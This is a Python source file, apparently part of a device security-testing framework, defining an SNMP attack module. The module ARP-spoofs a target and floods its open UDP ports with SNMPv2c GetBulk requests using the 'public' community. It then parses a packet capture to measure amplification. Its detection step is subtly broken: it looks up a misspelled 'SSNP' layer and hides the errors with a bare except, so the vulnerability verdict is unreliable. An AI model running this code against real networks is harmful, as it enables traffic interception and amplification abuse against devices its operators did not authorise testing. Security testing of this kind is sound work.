
from generic_attack import *
import logging
log = logging.getLogger(__name__)
import threading
from arp_spoof import ArpSpoof
from scapy.all import *
class Snmp(GenericAttack):

    def __init__(self, attackName, attackConfig, deviceConfig):
        super(Snmp, self).__init__(attackName, attackConfig, deviceConfig)

    def initialize(self, result):
        self.running = True
        target = self.device['ip']
        global arpspoof
        arpspoof = ArpSpoof("ArpSpoof", self.config, self.device)

        if self.device["vulnerable_ports"] is None:
            result.update({"status": "no open ports"})
            return

        if "udp" not in self.device["vulnerable_ports"].keys():
            result.update({"status": "no open ports"})
            return

        if "open" not in self.device["vulnerable_ports"]["udp"].keys():
            result.update({"status": "no open ports"})
            return


        self.running = True
        arp_status = {}
        tarp = threading.Thread(target=arpspoof.initialize, args=(arp_status,))
        tarp.start()
        time.sleep(5)


        packetCount = self.config['packet_count']

        for port in self.device["vulnerable_ports"]["udp"]["open"]:
            for x in range(0, packetCount):
                send(IP(dst=target) / UDP(dport=port) / SNMP(version="v2c", community='public',PDU=SNMPbulk(id=RandNum(1, 200000000),max_repetitions=10,varbindlist=[SNMPvarbind(oid=ASN1_OID('1'))])))
                time.sleep(0.5)

        arpspoof.shutdown()
        tarp.join()

        file_prefix = self.config["file_prefix"]
        filename = 'results/' + self.device['time'] + '/' + file_prefix + '.pcap'
        pcap = rdpcap(filename)
        sessions = pcap.sessions()
        vulnerable = False
        for session in sessions:
            for packet in sessions[session]:
                try:
                    print packet['SSNP']
                    if packet['IP'].dst == target and packet['SSNP'].type == 8:
                        initialPacketSize = len(packet)

                    if packet['IP'].src == target and packet['SSNP'].type == 0 and (not initialPacketSize == 0):
                        result.update({"amplification_factor": len(packet) / initialPacketSize})
                        vulnerable = True
                except:
                    pass

        if vulnerable:
            result.update({"status": "vulnerable"})
        else:
            result.update({"status": "not_vulnerable"})
        return

    def shutdown(self):
        self.running = False

    def prerequisite(self):
        return ["PortVulnerabilityTest"]
